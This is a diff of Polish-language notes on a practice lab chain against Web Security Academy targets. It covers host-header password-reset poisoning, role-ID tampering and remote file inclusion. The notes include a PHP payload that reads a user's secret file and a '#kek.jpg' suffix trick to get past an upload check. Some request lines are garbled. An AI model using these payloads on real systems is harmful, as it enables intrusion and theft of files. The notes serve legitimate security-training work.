@@ -1,4 +1,4 @@
-I PODEJŚCIE, MASZYNKA A [Host Header+RoleId na zasobie admina+RFI]
+I PODEJŚCIE, MASZYNKA A [Host Header na 2etapie forgot password+RoleId na zasobie admina+RFI]
 
 Maszynka A stage1: Cel zdobycie carlosa
 "Host header authentication bypass" lub "Host header poisoning via password reset", ""Password Reset Poisoning via Host Header"
@@ -154,7 +154,7 @@ Content-Length: 130
 }
 
 
-intruder
+intruder na update email
 https://github.com/user-attachments/assets/6c6554fc-d37c-4092-9485-659a2683dc32
 https://github.com/user-attachments/assets/25a60684-25c5-4d0b-9ca7-9847620ce0aa
 
@@ -205,7 +205,7 @@ payload jest na serwerze. !exploit server nie wykonuje kodu php. wykonanie nasta
 
 
 
-POST /admincont rols/imagefile HTTP/2
+POST /admincontrols/imagefile HTTP/2
 Host : Oaf7004b03469209810f4e5200da0049.web-security-academy. net
 Cookie: session=
 of Mv 62EALvT61WXW2zFGQfLFFLzKKQ8t
@@ -237,10 +237,7 @@ https%3A%2F%2Fexploit-Oa02007d033192c181864dfd017c00e7.exploit-server.net%2Fshel
 
 
 EXPLOIT SERVER - STORE!
-
-pytanie, jaki endpoint Exploit server:
-https://exploit-server.com/shell.php dawał 200 w logach.
-https://exploit-server.com/shell.php#kek.jpg dawał 400 w logach
+https://exploit-server.com/shell.php dawał 200 w logach
 
 body:
 <?php echo file_get_contents('/home/carlos/secret'); ?>
@@ -248,7 +245,7 @@ body:
 przegladarka:
 pytanie jaki link na stronie zuploadowany, chyba ten z 200. gdy ofiara go zobaczyla, przychodzil jej secret na endpoint /blogImage/shell.php
 https://exploit-server.com/shell.php dawał 200 w logach.
-https://exploit-server.com/shell.php#kek.jpg dawał 400 w logach
+-> w intruderze zmieniam na https://exploit-server.com/shell.php#kek.jpg
 
 Na ten endpoint przychodzi secret carlosa:
 GET /blogImage/shell.php
@@ -338,7 +335,7 @@ Referer: https://Oae600lc04191df583de5fla00f700b4.web-security-academy.net/refre
 Accept-Encoding: gzip, deflate, br
 Priority: u=0, i
 
-csrf=G4Zst X2gwRt uSAMJS2JVKWhBoot fNYue&password=null&username=administator
+csrf=G4ZstX2gwRtuSAMJS2JVKWhBootfNYue&password=null&username=administator
 
 
 
